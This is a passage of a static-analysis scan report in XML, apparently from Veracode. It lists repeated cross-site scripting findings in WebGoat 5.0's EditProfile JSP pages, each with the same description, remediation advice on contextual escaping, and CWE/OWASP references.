        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getLastName().
        The tainted data originated from earlier calls to java.sql.statement.executequery,
        javax.servlet.servletrequest.getparameter, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"62\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"24\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"3\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getAddress1().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, javax.servlet.servletrequest.getparametervalues,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"66\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"27\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"43\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getAddress1().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, javax.servlet.servletrequest.getparametervalues,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"66\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"27\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"7\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getAddress1().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, javax.servlet.servletrequest.getparametervalues,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"66\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"27\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"224\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getAddress2().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        javax.servlet.servletrequest.getparametervalues, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"70\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"30\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"5\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getAddress2().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        javax.servlet.servletrequest.getparametervalues, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"70\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"30\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"83\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getAddress2().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        javax.servlet.servletrequest.getparametervalues, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"70\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"30\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"257\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getPhoneNumber().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"74\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"34\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"111\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getPhoneNumber().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"74\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"34\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"115\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getPhoneNumber().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"74\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"34\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"200\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getStartDate().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        javax.servlet.servletrequest.getparametervalues, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"78\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"37\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"102\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getStartDate().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        javax.servlet.servletrequest.getparametervalues, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
